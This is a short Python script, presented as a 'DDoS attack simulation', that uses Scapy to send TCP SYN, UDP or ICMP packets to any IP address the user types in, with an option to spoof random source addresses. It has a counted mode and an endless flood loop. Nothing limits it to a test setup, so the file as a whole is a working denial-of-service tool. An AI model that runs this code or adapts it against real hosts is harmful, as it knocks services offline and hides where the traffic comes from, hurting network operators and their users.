"""
DDOS Attack Simulation

Author: Meng-Ku Chen
Date: 2023-05-08
Description: This script allows the user to simulate a DDoS (Distributed Denial of Service) attack using Scapy library. 
"""
from scapy.all import *
import time
# Prompt user for input to configure the attack parameters
dst_ip = input("IP to attack: ")
type = input("\nSelect type: \n1) Simple \n2) Flood \nYour choice:")
if (type == "1"):
    n_ips = int(input("\nNumber of IPs: "))
    n_msg = int(input("\nNumber of messages per IP: "))
global type_attack 
type_attack  = input("\nSelect type: \n1) TCP \n2) UDP \n3) ICMP \nYour choice:")
orig_type = input("\nSelect IPs origin: \n1) Sigle \n2) Random\nYour choice: ")
print("")
if (orig_type == "1") :
    src_ip = input("Source IP: ")
else:
    src_ip = ""
    
def sendPacketFlood():
    while True:
        # Determine the source IP address for the packet
        src = src_ip if src_ip != "" else RandIP()
        # Create the packet based on the selected attack type
        if type_attack == "1":
            # create a TCP packet
            packet = IP(src=src, dst=dst_ip) / TCP(dport=8080, flags="S")/Raw(load="A"*100)
        elif type_attack == "2":
            # create a UDP packet
            packet = IP(src=src, dst=dst_ip) / UDP(dport=8080)/Raw(load="A"*100)
        else:
            # create a ICMP packet
            packet = IP(src=src, dst=dst_ip) / ICMP(type=8, code=0, id=12345, seq=1)/Raw(load="A"*100)
        send(packet)

def sendPacket():
    # Iterate over the specified number of IP addresses
    for i in range(n_ips):
        # Determine the source IP address for the packet
        src = src_ip if src_ip != "" else RandIP()
        # Iterate over the specified number of messages per IP
        for j in range(n_msg):
            if type_attack == "1":
                # create a TCP packet
                packet = IP(src=src, dst=dst_ip) / TCP(dport=8080)/Raw(load="a"*100)
            elif type_attack == "2":
                # create a UDP packet
                packet = IP(src=src, dst=dst_ip) / UDP(dport=8080)/Raw(load="a"*100)
            else:
                # create a ICMP packet
                packet = IP(src=src, dst=dst_ip) / ICMP(type=8, code=0, id=12345, seq=1)/Raw(load="a"*100)
            send(packet) 

# Record the starting time
t0 = time.time()
# Launch appropriate attack based on attack type
if type == "1":
    sendPacket()
else:
    sendPacketFlood()

# Calculate the total time taken for the attack
total_s = float(time.time() - t0)
# Calculate the total number of packets sent
total_p = int(n_ips) * int(n_msg)
# Calculate the packet sending speed
ratio = float(total_p)/float(total_s)
# Print the summary of the attack
print ("\nTotal: \nTime:\t%d seconds" % (total_s))
print ("Packets:\t%d \nSpeed:\t%d p/s" % (total_p, ratio))
